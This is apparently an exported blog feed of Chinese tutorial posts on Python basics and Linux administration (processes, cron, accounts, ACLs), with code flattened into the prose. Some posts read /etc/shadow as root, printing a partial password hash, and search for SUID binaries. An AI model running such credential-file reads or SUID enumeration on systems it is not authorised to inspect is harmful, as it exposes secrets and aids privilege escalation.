(前一个列子的赋值操作都没有对对象自身发生作用，而是改变引用指向) 列表可以通过引用其元素，改变对象自身(in-place change)。这种对象类型，称为可变数据对象(mutable object)–，词典也是这样的数据类型。而像之前的数字和字符串，不能改变对象本身，只能改变引用的指向，称为不可变数据对象(immutable object)__。我们之前学的元组(tuple)，尽管可以调用引用元素，但不可以赋值，因此不能改变对象自身，所以也算是immutable object. 0x00 从动态类型看函数参数传递函数的参数传递，本质上传递的是引用。 12345678910def f(x): x = 100 print xa = 1f(a)print a1001 参数x是一个新的引用，指向a所指的对象，如果参数是不可变(immutable)的对象，那么a和x引用之间相互独立，对参数x的操作不会影响引用a。 如果传递的是可变(mutable)的对象，那么改变函数参数，有可能改变原对象，所有指向原对象的引用都会受到影响:123456789def f(x): x[0] = 100 print xa = [1,2,4]f(a)print a[100,2,4][100,2,4]]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Python(14)函数对象]]></title>
      <url>%2F2016%2F05%2F01%2FPython(14)%E5%87%BD%E6%95%B0%E5%AF%B9%E8%B1%A1%2F</url>
      <content type="text"><![CDATA[Python中一切皆对象，函数也是对象，也具有属性。作为对象，它可以赋值给其它对象名，或者作为参数传递。 0x00 函数作为参数传递函数可以作为一个对象，进行参数传递。123456789def func(x, y): return x+ydef test(f, a, b): print &apos;test&apos; print f(a, b)test(f, 3, 4)` 0x01 lambda函数我可以将上面的func函数改写成lambda函数12func = lambda x,y: x+yprint func(3, 4) lambda生成一个函数对象，该函数参数为x，y，返回值为x+y。函数对象赋值给func，func的调用与正常函数无异。 我们可以因此而提高程序的灵活性，比如1test((lambda x,y: x**2 +y), 6, 9) 0x02 map()函数map()是Python的内置函数，它的第一参数是函数对象1re = map((lambda x: x+3),[1,3,5,6]) 我们可以看到，这里，map()有两个参数，一个时lambda所定义的函数对象，一个是包含有多个元素的表，而map()的功能是将函数对象依次作用于表的每一元素,每次作用的结果存储于返回的表re中。 map()通过读入的函数(这里是lambda函数)来操纵数据(“数据是表中的每一个元素，操纵是对每个数据加3”) 但是在Pyhton 3.x中，map()返回的值不是一个表，而是循环对象。 0x03 filter()函数filter函数的第一参数也是一个对象，同样是将作为参数的函数对象作用于多个元素，若函数对象返回的是True，则该次的元素被存储于返回的表中。filter通过读入的函数来筛选数据，同样，在Python3.x中，filter返回的不是表，而是循环对象。 12345678def func(a): if a &gt; 100: return True else: return Falseprint filter(func,[10,56,1010,1111])[1010, 1111] 0x04 reduce()函数reduce函数的第一个参数也是函数，但是有一个要求，就是这个函数自身能接受两个参数，reduce可以累进的将函数作用于各个参数12 print reduce((lambda x,y: x+y),[1,2,3,4,5])15 reduce的第一个参数是lambda函数，然后reduce将表中的前两个元素(1和2)传递给lambda函数，得到3，最后一次调用lambda函数，每次lambda函数的第一个参数是上一次的运算结果，而第二个参数为表中的下一元素，直到表中没有剩余元素 上面，相当于((((1+2)+3)+4)+5)]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Python(10)－循环对象－生成器－表推导]]></title>
      <url>%2F2016%2F05%2F01%2FPython(10)%EF%BC%8D%E5%BE%AA%E7%8E%AF%E5%AF%B9%E8%B1%A1%EF%BC%8D%E7%94%9F%E6%88%90%E5%99%A8%EF%BC%8D%E8%A1%A8%E6%8E%A8%E5%AF%BC%2F</url>
      <content type="text"><![CDATA[0x00 循环对象循环对象是这样一个对象，其包含一个next()方法(__next__方法，在Python3中)，这个方法的目的是进行到下一个结果，而在结束一系列结果之后，放回一个StopIteration错误。 当一个循环结构调用循环对象时，它就会每次循环的时候调用next()方法直到StopIteration出现，for循环接收到，就知道循环已经结束，停止调用next(). 相较于序列，循环对象的优势在于:不用在循环还没开始的时候，就生成要使用的元素，而是所有元素可以在循环的过程中逐次生成，节省空间，提高效率！ 0x01 迭代器(iterator)从技术上来说，循环对象和for循环调用之间还有一个中间层，就是要将循环对象转换成迭代器(iterator)。这一转换是通过使用iter()函数实现的。但从逻辑层面上，常常可以忽略这一层，所以循环对象和迭代器常常相互指代对方 0x02 生成器(genetator)生成器的主要目的是构成一个用户自定义的循环对象，其编写方法与函数类似，只是将return改为了yield. 123456789def gen(): a = 10 yield a a = a*8 yield a yield 1000 &lt;===gen是一个生成器for i in gen(): print i def生成器共有三个yield，如果用作循环器，如上，将会进行三次循环 再看下面的一个生成器123def gen(): for i in range(4): yield i 它又可以写成一个生成器表达式(Generator Expression):1G = (x for x in range(4)) 生成器表达式是生成器的一种简便的编写方式 0x03 表推导(List Comprehension) 表推导是快速生成表的方法。假设我生成表L123L = []for x in range(10): L.append(x**2) 但实际上有快捷的写法，也就是表推导的方式:1L = [x**2 for x in range(10) ] 这个与生成器类似，不过使用的是中括号[] 看看下面的推导会是什么12345x1 = [1, 3, 5]y1 = [9, 12, 13]L = [x**2 for(x, y) in zip(x1, y1) if y &gt; 10]print L[9,25]]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Python(7)-模块]]></title>
      <url>%2F2016%2F05%2F01%2FPython(7)-%E6%A8%A1%E5%9D%97%2F</url>
      <content type="text"><![CDATA[模块(Module)与函数和对象本质上讲其目的都是为了更好的组织已有的程序，提高代码的可重复利用，在python中一个.py就构成一个模块，通过模块，我们可以调用其中的程序！ – 0x01 引用模块python中使用import关键字导入模块12import mathipmort sys 导入模块以后我们使用模块.对象的方式来调用模块中的某个对象，比如:1234import sysprint sys.version2.7.11 (v2.7.11:6d1b6a68f775, Dec 5 2015, 20:40:30) [MSC v.1500 64 bit (AMD64)] python中还有其他的引用方式 import a as b 引用模块，并将模块a重命名为b from a import function 从模块a中引用function对象，之后直接使用function，而不是a.function from a import * 从模块a中引入所有对象，使用时也是直接使用对象，而不是a.对象 python中会自带一下系统模块，如电子邮件模块，系统模块，其中与系统有关的模块是sys模块，它的一些基本对象如下1234import syssys.version #版本信息sys.executable #程序文件路径sys.modules.keys() #已经导入的模块关键字 0x02 模块搜索路径Python会在以下路径中搜索它想要的模块: 程序所在文件夹 标准库的安装路径 (python/lib) 操作系统PATH所包含的路劲 0x03 模块包将功能相似的模块放在同一个文件夹(this_dir)，构成一个模块包，通过1import this_die.module 引入this_dir文件夹中的模块 但是文件夹中必须包含一个init.py的文件，提醒Python，该文件夹为一个模块包，init.py可以是一个空文件！]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[第十七章-程序管理与SELLinux]]></title>
      <url>%2F2016%2F04%2F27%2F%E7%AC%AC%E5%8D%81%E4%B8%83%E7%AB%A0-%E7%A8%8B%E5%BA%8F%E7%AE%A1%E7%90%86%E4%B8%8ESELinux%2F</url>
      <content type="text"><![CDATA[0x00 什么是程序管理 进程与程序(process &amp;&amp; program)当我们运行一个命令或者程序的时候，系统就会产生一个进程，并分配给这个进程一个id，即PID，每个进程对应一个PID，每个PID也只对应一个进程！ Linux的fork机制在linux里面基本上每一个子程序的产生都是由父程序以复制(fork)的方式，而这个程序与父程序唯一的差别就是PPID不同。 服务服务(daemon)，其实就是常驻在内存当中的程序，通常负责一些系统所提供的功能以服务使用者各项任务。 0x01 工作管理(job control)job control的意思是:当我们登陆系统取得 bash shell之后，在单一终端机介面下同时进行多个工作的行为管理,比如一边复制文件一边打包，一边进行vi编辑。 工作管理?我们把可以出现提示字节让你操作的环境就称为前景(foreground)，至于其他工作就可以让你放入背景 (background) 去暂停或运行。 job control:&amp;,[ctrl-z],jobs,fg,bg,kill 直接将命令丢到背景中运行:&amp; 假如我们将整个/etc备份成为/tmp/etc.tar.gz，且不想等待，则可以这样做： 12root@jack:~# tar -zpcvf /tmp/etc.tar.gz /etc &gt; /tmp/log.txt 2&gt;&amp;1 &amp;[1] 2130 输入一条命令后，在命令后加上&amp;就代表将该命令丢到背景中，此时bash给予该命令一个工作号码，其实就是该命令的pid了。然后我们使用数据流重定向，将该命令可能产生的错误输出到/tmp/log.txt文件中，当命令完成时会在终端中出现如下信息:1[1]+ 已完成 tar -zpcvf /tmp/etc.tar.gz /etc &gt; /tmp/log.txt 2&gt;&amp;1 ctrl-z 有时我们会正在使用vi对一个文件进行编辑，但是突然要查找某个文件，这时你会按下ctrl-z退出vi(其实按下ctrl-z并没有真正的退出vi编辑，系统只是将这个任务暂停了) 123456root@jack:~# vim /tmp/log.txt (ctrl-z)[1]+ 已停止 vim /tmp/log.txtroot@jack:~# find / -print ...(ctrl-z) 观察目前背景中作状态:jobs { Usage $: jobs -[lrs] } 选项与参数: -l:除了列出 job number 与命令串之外，同时列出 PID 的号码； -r:仅列出正在背景 run 的工作 -s:仅列出正在背景当中暂停 (stop) 的工作123root@jack:~# jobs -l[1]- 2156 停止 vim /tmp/log.txt[2]+ 2168 停止 find / -print + 代表最近被放到背景的工作号码， - 代表最近最后第二个被放置到背景中的工作号码 fg从背景中取出工作 fg(foreground)的意思就是将背景中的过工作拿到前景中来了 { Usage $: fg %jobnumber }是工作号码，不是PID哈 12345root@jack:~# jobs -l[1]- 2156 停止 vim /tmp/log.txt[2]+ 2168 停止 find / -printroot@jack:~# fg %1vim /tmp/log.txt 让工作在背景下运行bg 123456root@jack:~# jobs;bg 2;jobs[1]- 已停止 vim /tmp/log.txt[2]+ 已停止 find / - print &gt; /tmp/find.txt[2]+ find / - print &gt; /tmp/find.txt &amp;[1]+ 已停止 vim /tmp/log.txt[2]- 运行中 find / - print &gt; /tmp/find.txt &amp; kill进程终结者 { Usage $: kill [-1 9 15] } 选项与参数: -1:重新读取一次参数的配置档 (类似 reload) -9:立刻强制删除一个工作 -15:以正常的程序方式终止一项工作。与 -9 是不一样的 12345root@jack:~# jobs -l[1]+ 2270 停止 vim /tmp/log.txtroot@jack:~# kill -9 2270root@jack:~# jobs[1]+ 已杀死 vim /tmp/log.txt 此外，需要注意的是 kill 后面接的数字默认会是 PID ，如果想要管理 bash 的工作控制，就得要加上 %数字123root@jack:~# jobs[1]+ 已停止 vim /tmp/log.txtroot@jack:~# kill -9 %1 离线管理:nohup 想要让在背景的工作在你注销后还能够继续的运行，那么使用 nohup 搭配 &amp; 是不错的运行情境: 1root@jack:~# nohup ./sleepsh02.sh &amp; 0x02 程序管理下面我们将了解如何观察程序与程序的状态，然后再加以程序控制！ 观察程序:ps,top,pstreeps静态观察 选项与参数 ps aux:观察系统所有的程序数据 ps -l:仅观察自己的相关程序 ps axjf:连同部分程序树 仅观察自己的相关程序:ps -l 1234567891011121314root@jack:~# ps -lF S UID PID PPID C PRI NI ADDR SZ WCHAN TTY TIME CMD0 S 0 2253 2247 0 80 0 - 6308 - pts/1 00:00:00 bash0 R 0 2482 2253 0 80 0 - 2708 - pts/1 00:00:00 ps#-----#F:代表程序旗标，常见的０表示此程序的权限为rootS:代表程序状态(stat),D(runing),S(sleep),D(不可唤醒的睡眠状态),Ｔ(stoop),Z(Zombie)僵尸态UID/PID/PPID:C:CPU使用率PRI/NI:Priority/Nice缩写，此程序被cpu所运行的优先顺序，数字越小越优先ADDR/SZ/WCHAN:与内存有关TTY:登录者的终端机，远程为(pst/n)TIME:占用cpu的时间CMD:command的缩写 ps -l 则仅列出与你的操作环境 (bash) 有关的程序而已， 亦即最上一级的父程序会是你自己的 bash 而没有延伸到 init 这支程序,他的内容如下: bash 的程序属於 UID 为 0 的使用者，状态为睡眠 (sleep)， 之所以为睡眠因为他触发了 ps (状态为 run) 之故。此程序的 PID 为 2253，优先运行顺序为 80 ， 下达 bash 所取得的终端介面为 pts/1 ，运行状态为等待 (wait) ps aux观察系统所有程序12345678910root@jack:~# ps auxUSER PID %CPU %MEM VSZ RSS TTY STAT START TIME COMMANDroot 1 0.0 0.0 176724 5028 ? Ss 08:37 0:01 /lib/systemd/s#-----#%CPU:该程序使用的cpu百分比%MEN:该程序使用的实体内存百分比STAT:程序状态(R/S/D/T/Z)START:该程序启动时间TIME:已实际使用cpu运行的时间COMMAND:该程序实际命令 找出与 cron 与 syslog 这两个服务有关的 PID 号码12345root@jack:~# ps aux | egrep &apos;(cron|syslog)&apos;root 671 0.0 0.0 27644 2780 ? Ss 08:37 0:00 /usr/sbin/cron -froot 723 0.0 0.0 258672 3420 ? Ssl 08:37 0:00 /usr/sbin/rsyslogd -nDebian-+ 852 0.0 0.1 361492 9408 ? S&lt;l 08:37 0:00 /usr/bin/pulseaudio --start --log-target=syslogroot 2514 0.0 0.0 12892 1556 pts/1 S+ 11:03 0:00 grep -E (cron|syslog) zombie发现在某个程序的 CMD 后面还接上 时，就代表该程序是僵尸程序啦,这时我们就需要一步一步跟踪它直到找出它的父程序然后杀掉它！ top不同于ps，top可以将目前系统程序运行状态动态的显示出来:12345678 root@jack:~# top top - 11:13:32 up 2:36, 2 users, load average: 0.15, 0.18, 0.17Tasks: 175 total, 2 running, 172 sleeping, 1 stopped, 0 zombie%Cpu(s): 3.0 us, 0.7 sy, 0.0 ni, 96.3 id, 0.1 wa, 0.0 hi, 0.0 si, 0.0 stKiB Mem: 5792464 total, 2549740 used, 3242724 free, 231280 buffersKiB Swap: 7908348 total, 0 used, 7908348 free. 833968 cached MemPID USER PR NI VIRT RES SHR S %CPU %MEM TIME+ COMMAND 1168 root 20 0 2011860 231160 59236 S 5.4 4.0 3:35.12 gnome-shell top默认使用能cpu占用率进行排序！ pstree 要找到进程之间的相关性，pstress是必不可少的命令，它会使用线段将相关性进程连接起来。12root@jack:~# pstree -up#列出每个进程的PID以及所属的账号名称 进程管理:signal,kill,killall进程之间是可以相互控制的，但是又是如何相互控制的呢？其实就是信号了，我们通过给某个进程传递一个讯号从而告知该进程想要它做什么，因此这个信号就很重要了！ 下面是主要的一些信号内容: 数字 名称 内容 1 SIGHUP 启动被终止的进程，可让该 PID 重新读取自己的配置档，类似重新启动 2 SIGINT 相当于用键盘输入 [ctrl]-c 来中断一个进程的进行 9 SIGKILL 代表强制中断一个进程的进行，如果该进程进行到一半， 那么尚未完成的部分可能会有『半产品』产生，类似 vim会有 .filename.swp 保留下来。 15 SIGTERM 以正常的结束进程来终止该进程，不是使用于当该进程已近发生错误 17 SIGSTOP 相当於用键盘输入 [ctrl]-z 来暂停一个进程的进行 那么如何将信号传递给进程呢？就是kill，killall命令了 kill -singal PID 管理单个进程 1root@jack:~# kill -9 %1 killall -singal 进程名称 管理整个服务强制杀掉所有以httpd启动的服务 1root@jack:~# killall -9 httpd 需要强调的是， kill 后面直接加数字（代表进程PID）与加上 %number(jobs查询到的工作号码) 的情况是不同的！ 关于进程的运行顺序 Liunx中进程运行的优先顺序与PRI(priority)值有关，PRI的值越低代表越优先的意思，但是这个PRI的值是由系统核心动态调整的，使用者无法直接调整PRI的值，如果想要改变进程的优先顺序，就得通过Nice值，它们的关系是: __PRI(new)=PRI(old)+nice 对root而言nice的可调整范围为:-20-19,一般使用者为0-19,然后我们有两种方式给予某给进程nice值 nice:在进程开始运行时给予nice值 { Usage $: nice [-n 数字] command } 1root@jack:~# nice -n -5 vi &amp; renice:调整已经运行进程的nice值 { Usage $: renice [number] PID } 123456root@jack:~# ps -lF S UID PID PPID C PRI NI ADDR SZ WCHAN TTY TIME CMD4 T 0 2384 1606 0 75 -5 - 43557 - pts/0 00:00:00 vi0 R 0 2390 1606 0 80 0 - 2708 - pts/0 00:00:00 psroot@jack:~# renice 6 23842384 (process ID) old priority -5, new priority 6 系统资源观察 free观察内存使用情况 12345root@jack:~# free total used free shared buffers cachedMem: 5792464 1537280 4255184 148380 50304 576536-/+ buffers/cache: 910440 4882024Swap: 7908348 0 7908348 uname查看系统核心信息 12root@jack:~# uname -aLinux jack 4.0.0-kali1-amd64 #1 SMP Debian 4.0.4-1+kali2 (2015-06-03) x86_64 GNU/Linux uptime系统启动时间与工作负载 12root@jack:~# uptime 13:35:42 up 10 min, 2 users, load average: 0.29, 0.26, 0.21 netstat追踪网络和系统插槽 找出目前系统上已经在监听的网络及其PID 123root@jack:~# netstat -tlnpActive Internet connections (only servers)Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program name dmesg:分析核心信息例如，查看启动时硬盘的信息 123root@jack:~# dmesg | grep -i hd[ 0.082322] NMI watchdog: enabled on all CPUs, permanently consumes one hw-PMU counter.[ 7.737685] iTCO_wdt: Intel TCO WatchDog Timer Driver v1.11 或者查看系统网卡相关信息123root@jack:~# dmesg | grep -i eth[ 0.881331] e1000e 0000:00:19.0 eth0: registered PHC clock[ 0.881352] e1000e 0000:00:19.0 eth0: (PCI Express:2.5GT/s:Width x1) vmstat检测系统资源变化1234root@jack:~# vmstatprocs -----------memory---------- ---swap-- -----io---- -system-- ------cpu----- r b swpd free buff cache si so bi bo in cs us sy id wa st 1 0 0 4290044 51168 581576 0 0 96 11 79 420 3 1 93 2 0 0x03 特殊文件与程序 具有SUID/SGID权限的命令运行状态 如何查找具有SUID/SGID权限的文件和目录？1root@jack:/tmp# find / -perm +6000 /proc/* 的意义 程序都是存放在内存中的，而内存中的数据又都写到来/proc这个目录中，基本上，目前主机上面的各个程序的 PID 都是以目录的型态存在於 /proc 当中。 运行文查询:fuser,lsof,pidof fuser借文件找出正在使用该文件的程序 找出所有使用到/proc这个文件系统的程序 12345root@jack:~# fuser -mvu /proc 用户 进程号 权限 命令/proc: root kernel mount (root)/proc root 1 f.... (root)systemd root 241 f.... (root)systemd-journal 找出使用到单个文件系统的程序12345root@jack:~# fuser -uv /run/systemd//sessions/1.ref 用户 进程号 权限 命令/run/systemd/sessions/1.ref: root 677 f.... (root)systemd-logind root 906 F.... (root)gdm-session-wor 杀死该进程1234root@jack:~# fuser -ki /run/systemd//sessions/1.ref /run/systemd/sessions/1.ref: 677 906杀死进程 677 ? (y/N) n杀死进程 906 ? (y/N) n lsof找出进程所开启的文件 找出该目录下正在被使用的文件 1root@jack:~# lsof +d /dev 找出属于root的bash正在使用的文件12root@jack:~# lsof -u root | grep bashbash 1606 root cwd DIR 8,13 4096 524289 /root pidof找出某个正在运行进程的PID找出init进程的pid12root@jack:~# pidof init1 0x04 SELinux]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Python(9)-关键字－闭包]]></title>
      <url>%2F2016%2F04%2F27%2FPython(9)-%E5%85%B3%E9%94%AE%E5%AD%97-%E9%97%AD%E5%8C%85%2F</url>
      <content type="text"><![CDATA[0x00 Keywords(关键字) keywords description example as 上下文管理器 with…as… assert … … break 跳出循环 while Treu:break class 类 class persion del 删除字典 del x[y] except 异常抛出 …. finally 最后强制执行 … global 全局变量 … is 与“==”类似 … lambad 自定义函数 … with 将一个表达式作为变量 with x as y:pass yield 暂停并放回声音 def x():yield y;x().next() 0x01 格式化字符串 符号 描述 %d 整数 “%d” % 45 == ‘45’ %i 与%d一样 … %o 八进制数 “%o” % 1000 == ‘1750’ %u 无符号十进制数 “%u” % -100 == ‘-100’ %c 字符转换 “%c” % 34 == “ ‘ “ %r 调式，原生输出 “%r” % int == ““ %s 格式化字符串 “%s there” % “hi” == ‘hi there’ %% 百分号 … %x 小写十六进制 … %X 大写十六进制 … %e 小写科学计数法 … %E 大写科学计数法 … %f 浮点数 … %F 与%f一样 … %g %f或者%e，那个短用那个 … %G 与%g一样，但是大写显示 … 0x02 with…as…与上下文管理器 简单的说with/as语句的设计是作为常见的try/finally用法的模式替代方案.用于定义必须执行的终止或清理行为。 其实这里有一个关于上下文管理器的概念(context manager),是从python2.5开始支持的一种语法，用于规定某个对象的使用范围，它的语法形式就是with…as… 程序猿们常常在对文件进行操作以后而忘记关闭文件，上下文管理器可以在不需要文件时，自动关闭文件1234567with open(&apos;test.txt&apos;,&apos;w&apos;) as file: print(file.closed) file.write(&quot;hello world&quot;)print(file.closed)输出结果:FalseTrue 上下文管理器有隶属于它的程序块,当隶属的程序块执行结束的时候(也就是不再缩进)，上下文管理器自动关闭了文件 (我们通过file.closed来查询文件是否关闭)。我们相当于使用缩进规定了文件对象file的使用范围。 0x03 闭包 闭包(closure)是函数式编程的重要语法结构，在面向过程中编程中我们见过函数(function)，在面向对象中编程中我们见过对象(object),以及现在的闭包，它们的根本目的都是一样的，以某种逻辑方式组织代码，提高可重复使用性(reusability). 先说结论，python中的闭包其实就是一个含有环境变量(你也可以理解为局部变量)取值的函数对象，一个函数和它的环境变量合在一起就构成了一个闭包。 我们看下面的例子:12345678def line_conf(a, b): def line(x): return a*x+b return lineline1=line_conf(1, 1) line2=line_conf(2, 4) print(line1(5), line2(5))返回结果:(6,14) 在这个例子中，函数line与环境变量a，b构成了闭包。在创建闭包的时候我们，line_conf的参数a，b说明了这两个变量的取值，我们只需要变换a，b就可以获得不同的直线表达式，由此我们可以看到闭包具有提高代码可重复性的作用！ 参考来源:http://www.cnblogs.com/vamei/archive/2012/11/23/2772445.html]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[第十六章-例行性管理]]></title>
      <url>%2F2016%2F04%2F27%2F%E7%AC%AC%E5%8D%81%E5%85%AD%E7%AB%A0-%E4%BE%8B%E8%A1%8C%E6%80%A7%E5%B7%A5%E4%BD%9C%2F</url>
      <content type="text"><![CDATA[0x00 what’s 例行性工作?例行性安排就是计划任务了，简单的讲就是计划一些将来需要执行的程序，我们设置好时间，Linux会负责执行的！ 0x01 仅运行一次的工作安排:atat 是个可以处理仅运行一次就结束排程的命令,不过，并不是所有的人都可以进行 at 工作排程,因为安全性问题哈，所以可以利用 /etc/at.allow 与 /etc/at.deny 这两个文件来进行 at 的使用限制 先找寻 /etc/at.allow 这个文件，写在这个文件中的使用者才能使用 at，没有在这个文件中的使用者则不能使用at 如果 /etc/at.allow 不存在，就寻找 /etc/at.deny 这个文件，若写在这个at.deny 的使用者则不能使用 at ，而没有在这个 at.deny 文件中的使用者，就可以使用 at 咯 如果两个文件都不存在，那么只有 root 可以使用 at 这个命令 123456root@jack:~# at now +5 minutes#root@jack:~# at 23:00 2016-5-1warning: commands will be executed using /bin/shat&gt; ping www.sina.com &gt;&gt; pingsina.txtat&gt; &lt;EOT&gt;job 6 at Wed Apr 27 09:49:00 2016 五分钟以后ping sina.com并将结果保存到pingsina.txt文件里当我们输入at命令以后，会进去一个at shell的工作环境里，所以当我们在次at里在写入例行程序时最好使用绝对路径哈！ 然后，使用atq查询at工作安排12root@jack:~# atq6 Wed Apr 27 09:49:00 2016 a root 最后，使用atrm + 例行程序id，atq查询所得的前面的数字代表了该例行程序的ID:1root@jack:~# atrm 7 0x02 循环运行的工作安排 at 是仅运行一次的工作，循环运行的例行性工作排程则是由 cron (crond)这个系统服务来控制的,由於使用者自己也可以进行例行性工作排程，so, Linux 也提供使用者控制例行性工作排程的命(crontab) 与 at 同样的，我们可以限制使用 crontab 的使用者帐号: /etc/cron.allow将可以使用 crontab 的帐号写入其中，若不在这个文件内的使用者则不可使用 crontab /etc/cron.deny在文件下的账号均不可使用crontab crontab{ Usage $ : crontab [-u username] [-l | e | -r] } -u:只有root才能运行这个任务 -e:编辑crontab的工作内容 -l:查询工作内容 -r :移除所有工作内容 假若你的女朋友生日是 5 月 2 日，你想要在 5 月 1 日的 23:59 发一封信给他，这封信的内容已经写在 /home/dmtsai/lover.txt 内了12345root@jack:~# crontab -e59 23 1 5 * mail kili &lt;/home/jack/birthday.txt&gt;crontab: installing new crontabroot@jack:~# crontab -l59 23 1 5 * mail kili &lt;/home/jack/birthday.txt&gt; crontab -e主要是针对使用者的，如果要是对系统经行例行行安排那么请直接修改/etc/crontab文件就行了 123456root@jack:~# cat /etc/crontab# /etc/crontab: system-wide crontab# m h dom mon dow user command17 * * * * root cd / &amp;&amp; run-parts --report /etc/cron.hourly25 6 * * * root test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.daily )47 6 * * 7 root test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.weekly )# ``]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[第十四章-账号管理与ACl权限]]></title>
      <url>%2F2016%2F04%2F25%2F%E7%AC%AC%E5%8D%81%E5%9B%9B%E7%AB%A0-%E8%B4%A6%E5%8F%B7%E7%AE%A1%E7%90%86%E4%B8%8EACL%E6%9D%83%E9%99%90%2F</url>
      <content type="text"><![CDATA[0x00 账号与群组 使用者标志符:UID，GID在第六章我们提到过，每个文件都具有使用者与群组的属性，因为每个登录者都会有两个ID,一个是使用者ID(User ID,UID)，一个是群组ID(Group ID,检查GID)，而每个文件都会有所谓的UID与GID，当我们有要显示文件属性需求时，系统会根据/etc/passwd,/etc/group的内容，找到UID/GID对应的账号与组名在显示出来。 使用者账号:/etc/passwd，/etc/shadow文件结构简单的讲/etc/passwd主要记录与UID/GID有关的参数，而/etc/shadow则是就来登录密码的 /etc/passwd文件 该文件结构如下:123456root@jack:~# head -n 4 /etc/passwdroot:x:0:0:root:/root:/bin/bash账号名称/早期口令/UID/GID/用户信息说明兰/家目录/Shelldaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologinbin:x:2:2:bin:/bin:/usr/sbin/nologinsys:x:3:3:sys:/dev:/usr/sbin/nologin 该文件使用”:”隔开，共分为7段，说明如下: x:早期unix口令存放段，由于安全性，现已弃用 UID:UID是0是代表该账号是系统超级用户，所以只要将某个使用者的UID改为0，那么他便成为超级用户，但，最好别这样玩。 GID:与/etc/group有关，其实/etc/group与/etc/passwd差不多 用户信息栏:无多大意义 家目录:默认用户的家目录是在/home/yourIDname Shell:当用户登陆系统后就会取得一个 Shell 来与系统的核心沟通以进行用户的操作任务 /etc/shadow文件 该文件结构如下:123root@jack:~# head -n 2 /etc/shadowroot:$6$OxMBc0:16885:0:99999:7:::daemon:*:16658:0:99999:7::: 同样的该文件使用”:”隔开，共分为9段，说明如下: 账号名称：与/etc/passwd对应 密码:经过MD5加密 最近更改密码日期:why?16885,这个是因为计算 Linux 日期的时间是以 1970 年 1 月 1 日作为 1 而累加的日期，1971 年 1 月 1 日则为 366 .至于想要知道某个日期的累积日数: 12root@jack:~# echo $(($(date --date=&quot;2016/04/25&quot; +%s)/86400+1))16916 密码不可更改天数:0代表随时可改 密码需重新更改天数:为了强制要求用户变更口令，这个字段可以指定在最近一次更改口令后， 在多少天数内需要再次的变更口令才行。 密码需更改期限前的警告天数 密码过期后的宽限时间（密码失效日） 账号失效日期: 这个账号在此字段规定的日期之后，将无法再使用。 就是所谓的『账号失效』，此时不论你的口令是否有过期，这个『账号』都不能再被使用！ 这个字段会被使用通常应该是在『收费服务』的系统中，你可以规定一个日期让该账号不能再使用啦！ 保留 关于群组:/etc/group文件结构该文件结构如下:123456root@jack:~# head -4 /etc/grouproot:x:0:组名/群组口令/GID/该群组支持的账号名称daemon:x:1:bin:x:2:sys:x:3: pass 0x01 账号管理 增加与删除使用者useradd { usage $: useradd -[u UID] [-g 初始群组] [-mM] [-d 家目录绝对路径] 账号名 } 新添加一个用户:jack1root@jack:~# useradd -g root -d /home jack passwd 口令更改 { usage $ : passwd 账号名 } &lt;=root功能 { usage $ : passwd [–stdin] } &lt;==所有人均可更改自己口令 在root下更改jack口令: 123vroot@jack:~# passwd jack输入新的 UNIX 密码：重新输入新的 UNIX 密码： 使用stdin更改口令12345678root@jack:~# echo &quot;234&quot; | passwd --stdin jack``当然这个不是所有的linux发行版都支持的，比如kali就不支持了##### userdel 用户删除 __ &#123; usage $ : userdel [-r] username &#125;__删除jack，连同家目录也删除，并删除所有jack root@jack:~# userdel -r jack12345678910111213141516171819202122232425262728293031323334353637383940414243444546其实用户如果在系统上面操作过一阵子了，那么该用户其实在系统内可能会含有其他文件的，如果想要完整的将某个账号完整的移除，最好可以在下达 userdel -r username 之前， 先以『 find / -user username 』查出整个系统内属于 username 的文件，然后再加以删除吧！---#### 用户功能下面了解下一般使用者常用的系统命令* __finger__:用来查询用户相关信息，大多是/etc/passwd里面信息* __chfn__:可理解为chang finger，意义不大* __chsh__:change shell的缩写，即是更改该用户使用的shell* __id__:查询自己相关的uid/gid信息，__&#123;id 账号名称&#125;__可用来判断某账号存在不存在---#### 新增与删除群组##### groupadd:增加群组 __&#123; usage $ : groupadd [-g gid] [-r] 组名 &#125;__##### groupdel:删除群组 __&#123; usage $ : groupdel 组名 &#125;__但是删除群组时要确认 /etc/passwd 内的账号没有任何人使用该群组作为initial group 才能删除---### 0x02 主机的细部权限规划----#### 什么是ACL？ACL是针对单一使用者，对单一文件或目录来进行rwx的权限规范，对于需要特殊权限的使用状况非常有帮助！它可以针对使用者，群组，或者在该目录下创建新文件/目录时，配置默认权限。##### setfacl:配置某个文件/目录的ACL __&#123; usage $: setfacl [-bkRd] [&#123;-m|-x&#125; acl参数] filename &#125;__ __选项与参数:__ * -m ：配置后续的 acl 参数给文件使用，不可与 -x 合用； * -x ：删除后续的 acl 参数，不可与 -m 合用； * -b ：移除所有的 ACL 配置参数； * -k ：移除默认的 ACL 参数，关于所谓的『默认』参数于后续范例中介绍； * -R ：递归配置 acl ，亦即包括次目录都会被配置起来； * -d ：配置『默认 acl 参数』的意思！只对目录有效，在该目录新建的数据会引用此默认值 赋予jack用户test文件的rw权限 root@jack:~# setfacl -m u:jack:rw test12##### getfacl:查看某个文件/目录的ACL配置 root@jack:~# getfacl test file: testowner: rootgroup: rootuser::rw-user:jack:rw- &lt;===新增加的acl权限group::r–mask::rw-other::r–1再次查看test文件，发现多了一&quot; + &quot;的权限，就是acl了: root@jack:~# ll test-rw-rw-r–+ 1 root root 0 4月 26 15:37 test123456789101112131415161718192021222324252627如果想要取消文件的全部acl权限，使用__&#123; $ : setfacl -b filename &#125;__就ok了！----### 0x03 使用者切换----#### susu用户身份切换，可以直接切换到root，或由root切换到一般用户----#### sudo sudo运行root的命令串，但并非所有人都能够运行 sudo ，而是仅有规范到 /etc/sudoers 内的用户才能够运行 sudo 这个命令。---### 0x04 使用者的特殊shell与PAM模块PAM 可以说是一套应用程序编程接口 (Application Programming Interface, API)，他提供了一连串的验证机制，只要使用者将验证阶段的需求告知 PAM 后， PAM 就能够回报使用者验证的结果 (成功或失败)。---### 0x05 